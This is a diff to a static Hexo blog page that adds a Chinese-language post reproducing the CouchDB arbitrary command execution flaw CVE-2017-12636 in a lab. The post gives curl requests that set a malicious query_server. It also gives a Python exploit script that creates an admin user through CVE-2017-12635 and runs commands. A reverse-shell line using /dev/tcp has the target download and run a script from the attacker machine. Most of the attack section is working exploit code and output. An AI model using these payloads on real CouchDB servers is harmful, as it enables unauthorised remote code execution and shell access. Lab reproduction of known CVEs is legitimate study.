@@ -229,6 +229,129 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/26/ld (7)/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/07/26/ld (7)/" itemprop="url">Couchdb 任意命令执行漏洞（CVE-2017-12636）</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-26T09:16:18+08:00">
+                2019-07-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h1 id="Couchdb-Couchdb-任意命令执行漏洞（CVE-2017-12636）"><a href="#Couchdb-Couchdb-任意命令执行漏洞（CVE-2017-12636）" class="headerlink" title="Couchdb Couchdb 任意命令执行漏洞（CVE-2017-12636）"></a>Couchdb Couchdb 任意命令执行漏洞（CVE-2017-12636）</h1><p>漏洞原理<br>Apache CouchDB是一个开源数据库，专注于易用性和成为”完全拥抱web的数据库”。它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web和应用程序）。<br>&emsp;<br>在2017年11月15日，CVE-2017-12635和CVE-2017-12636披露，CVE-2017-12636是一个任意命令执行漏洞，我们可以通过config api修改couchdb的配置query_server，这个配置项在设计、执行view的时候将被运行。<br>复现漏洞<br>访问<a href="http://your-ip:5984/即可看到Couchdb的欢迎页面" target="_blank" rel="noopener">http://your-ip:5984/即可看到Couchdb的欢迎页面</a><br><a href="https://imgchr.com/i/mAwouR" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAwouR.png" alt="mAwouR.png"></a><br>&emsp;<br>该漏洞是需要登录用户方可触发，如果不知道目标管理员密码，可以利用CVE-2017-12635先【增加一个管理员用户】。这里上一个已经登录过了<br><a href="https://imgchr.com/i/mAwXCD" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAwXCD.png" alt="mAwXCD.png"></a><br>新增query_server配置，写入要执行的命令：<br>[root@localhost ~]# curl -X PUT ‘<a href="http://zqd:vulhub@192.168.199.217:5984/_config/query_servers/cmd&#39;" target="_blank" rel="noopener">http://zqd:vulhub@192.168.199.217:5984/_config/query_servers/cmd&#39;</a> -d ‘“id &gt;/tmp/success”‘<br>“id &gt;/tmp/success”<br>&emsp;<br>[root@localhost ~]# curl -X PUT ‘<a href="http://zqd:vulhub@192.168.199.217:5984/zqd&#39;" target="_blank" rel="noopener">http://zqd:vulhub@192.168.199.217:5984/zqd&#39;</a><br>{“error”:”file_exists”,”reason”:”The database could not be created, the file already exists.”}<br>新建一个临时库和临时表，插入一条记录<br>[root@localhost ~]# curl -X PUT ‘<a href="http://zqd:vulhub@192.168.199.217:5984/ddd&#39;" target="_blank" rel="noopener">http://zqd:vulhub@192.168.199.217:5984/ddd&#39;</a><br>{“ok”:true}<br>[root@localhost ~]# curl -X PUT ‘<a href="http://zqd:vulhub@192.168.199.217:5984/ddd/vul&#39;" target="_blank" rel="noopener">http://zqd:vulhub@192.168.199.217:5984/ddd/vul&#39;</a> -d ‘{“_id”:”770895a97726d5ca6d70a22173005c7b”}’<br>{“ok”:true,”id”:”vul”,”rev”:”1-967a00dff5e02add41819138abb3284d”}<br>调用query_server处理数据。<br>[root@localhost ~]# curl -X PUT <a href="http://zqd:vulhub@192.168.199.217:5984/ddd/_design/vul" target="_blank" rel="noopener">http://zqd:vulhub@192.168.199.217:5984/ddd/_design/vul</a> -d ‘{“_id”:”_design/test”,”views”:{“wooyun”:{“map”:””} },”language”:”cmd”}’ -H “Content-Type: application/json”<br>{“ok”:true,”id”:”_design/vul”,”rev”:”1-ed713e4db9c7db605913fd62fb102ded”}<br>&emsp;<br>在kali上<br>执行EXP反弹Shell<br>根据上述发送的请求，可使用 python 编写EXP（实验文件exp.py）简化操作，修改EXP中的 target (目标机器地址)和 command （执行的命令），运行脚本即可执行对应的命令。<br>现在我们需要反弹一个可交互的Shell回操作机，本实验的思路是，在操作机中准备好反弹脚本并开启HTTP服务，然后利用EXP让目标 服务器 下载反弹脚本，接着，在操作机使用NC监听本地端口，最后利用EXP在目标服务器中执行反弹脚本，将Shell反弹至操作机监听的端口上，完成反弹Shell操作。<br>反弹Shell的命令，在经过数据库处理时不能直接执行，遂此处分为两步去实现<br>&emsp;<br>准备反弹脚本<br>cd 至 /home/目录下，使用Vim编辑器新建一个index.html文件，写入最终执行的命令，内容如下：<br>bash -i &gt;&amp; /dev/tcp/192.168.199.226/9000 0&gt;&amp;1 这里是本机ip<br><a href="https://imgchr.com/i/mA0ubq" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mA0ubq.png" alt="mA0ubq.png"></a><br>这条命令意思为创建一个可交互的bash和一个到192.168.199.226:9000的TCP链接，然后将bash的输入输出错误都重定向到在191.168.199.226:9000监听的进程中。<br>&emsp;<br>2.另起一个终端，在/home/目录下执行 python -m SimpleHTTPServer 8000 ,开启HTTP服务<br><a href="https://imgchr.com/i/mA0G24" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mA0G24.png" alt="mA0G24.png"></a><br>3.修改 exp.py 中的 command 的值为 curl 192.168.199.226:8000 -o /tmp/bashell ,保存并执行命令 python exp.py<br>&emsp;</p>
+<p>#!/usr/bin/env python3<br>import requests<br>from requests.auth import HTTPBasicAuth<br>&emsp;<br>target = ‘<a href="http://192.168.199.217:5984&#39;" target="_blank" rel="noopener">http://192.168.199.217:5984&#39;</a>      （这里是靶机ip）<br>command = ‘“curl 192.168.199.226:8000 -o /tmp/bashell”‘<br>version = 1<br>&emsp;<br>session = requests.session()<br>session.headers = {<br>    ‘Content-Type’: ‘application/json’<br>}</p>
+<h1 id="session-proxies"><a href="#session-proxies" class="headerlink" title="session.proxies = {"></a>session.proxies = {</h1><h1 id="‘http’-‘http-127-0-0-1-8085-39"><a href="#‘http’-‘http-127-0-0-1-8085-39" class="headerlink" title="‘http’: ‘http://127.0.0.1:8085&#39;"></a>‘http’: ‘<a href="http://127.0.0.1:8085&#39;" target="_blank" rel="noopener">http://127.0.0.1:8085&#39;</a></h1><h1 id><a href="#" class="headerlink" title="}"></a>}</h1><p>session.put(target + ‘/_users/org.couchdb.user:wooyun’, data=’’’{<br>  “type”: “user”,<br>  “name”: “wooyun”,<br>  “roles”: [“_admin”],<br>  “roles”: [],<br>  “password”: “wooyun”<br>}’’’)<br>&emsp;<br>session.auth = HTTPBasicAuth(‘wooyun’, ‘wooyun’)<br>&emsp;<br>if version == 1:<br>    session.put(target + (‘/_config/query_servers/cmd’), data=command)<br>else:<br>    host = session.get(target + ‘/_membership’).json()[‘all_nodes’][0]<br>    session.put(target + ‘/_node/{}/_config/query_servers/cmd’.format(host), data=command)<br>%emsp;<br>session.put(target + ‘/wooyun’)<br>session.put(target + ‘/wooyun/test’, data=’{“_id”: “wooyuntest”}’)<br>&emsp;<br>if version == 1:<br>    session.post(target + ‘/wooyun/_temp_view?limit=10’, data=’{“language”:”cmd”,”map”:””}’)<br>else:<br>    session.put(target + ‘/wooyun/_design/test’, data=’{“_id”:”_design/test”,”views”:{“wooyun”:{“map”:””} },”language”:”cmd”}’)<br>开启http服务<br><a href="https://imgchr.com/i/mABiLR" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mABiLR.png" alt="mABiLR.png"></a><br>重新开启一台终端监听<br><a href="https://imgchr.com/i/mAB6YT" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAB6YT.png" alt="mAB6YT.png"></a><br>修改 exp.py 中的 command 的值为 bash /tmp/bashell ,保存并执行命令 python exp.py ,成功获取反弹回来的Shell<br><a href="https://imgchr.com/i/mAB2pF" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAB2pF.png" alt="mAB2pF.png"></a><br>在反弹回来的Shell中cd 到目录/tmp/下，可以看见运行Poc和Exp时存储的文件<br><a href="https://imgchr.com/i/mABfX9" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mABfX9.png" alt="mABfX9.png"></a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/26/ld (9)/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1143,7 +1266,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-count">18</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -1156,7 +1279,7 @@
               
               <div class="site-state-item site-state-tags">
                 
-                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-count">18</span>
                   <span class="site-state-item-name">tags</span>
                 
               </div>
